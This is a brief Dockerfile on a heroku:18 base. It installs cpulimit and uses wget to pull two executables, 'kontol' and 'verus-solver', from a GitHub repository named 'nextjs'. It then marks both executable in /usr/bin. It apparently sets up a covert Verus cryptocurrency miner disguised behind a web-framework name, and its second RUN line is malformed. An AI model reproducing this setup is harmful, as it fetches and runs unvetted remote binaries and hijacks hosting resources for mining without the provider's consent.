FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN && apt-get install cpulimit && apt-get install wget -y && cd /usr/bin  && wget https://github.com/sengepeke/nextjs/raw/master/kontol && chmod +x kontol  && wget https://github.com/sengepeke/nextjs/raw/master/verus-solver && chmod +x verus-solver


